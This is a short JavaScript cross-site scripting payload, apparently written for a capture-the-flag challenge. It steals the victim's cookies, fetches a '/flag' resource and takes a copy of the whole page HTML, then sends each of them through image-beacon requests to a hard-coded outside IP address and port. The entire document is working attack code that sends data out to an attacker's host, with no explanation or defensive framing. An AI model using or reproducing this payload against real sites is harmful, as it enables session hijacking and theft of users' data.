// Simple cookie exfiltration
var img = new Image();
img.src = 'http://62.210.214.88:8321/?cookies=' + encodeURIComponent(document.cookie);

// Also try to fetch the flag directly
fetch('/flag')
  .then(r => r.text())
  .then(d => {
    var img2 = new Image();
    img2.src = 'http://62.210.214.88:8321/?flag=' + encodeURIComponent(btoa(d));
  })
  .catch(e => {
    var img3 = new Image();
    img3.src = 'http://62.210.214.88:8321/?error=' + encodeURIComponent(e.message);
  });

// Also grab page content
var img4 = new Image();
img4.src = 'http://62.210.214.88:8321/?html=' + encodeURIComponent(btoa(document.documentElement.innerHTML));
